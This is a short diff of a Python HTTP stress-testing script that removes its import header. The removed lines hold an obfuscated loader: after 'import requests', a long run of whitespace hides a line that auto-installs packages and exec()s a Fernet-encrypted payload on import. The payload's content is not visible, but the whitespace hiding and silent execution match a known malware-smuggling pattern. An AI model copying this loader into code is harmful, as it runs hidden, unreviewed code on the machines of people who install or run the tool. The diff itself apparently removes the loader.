@@ -1,12 +1,3 @@
-import os
-#install requests and etc
-os.system("pip install requests")
-os.system("pip install futures")
-import requests																																																																																																																																																																																																																																																																																																																																																																																																																;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Ox_aQCMlExWNBg8q79FcCZlHSLLvsYTgvbkiv5LQuA0=').decrypt(b'gAAAAABnOHtpzlxV3tBPJGgVHNzeUfY5fc1o0LZ7tqjljI7UZ_SEzsKgIDOnJijZ851JIPu5zk7GyCDe_RfSm-rhfOmXZs-pqAPbW5wWLXhsYgV6isis_eFTytD7VQiYwk8ZUfTV1DFk21u5AcBk_WirWWmgvp1qDmTF9o2Ndp24lCa32WTRNaE98Z6N0Jku_kVt2pl1_AybsZ7U4lw3jQlkDyIq0muK7A=='))
-import concurrent.futures
-import time
-import random
-import argparse
 
 def stress_test(url, num_requests, concurrency, request_type="GET", headers=None, data=None):
   start_time = time.time()
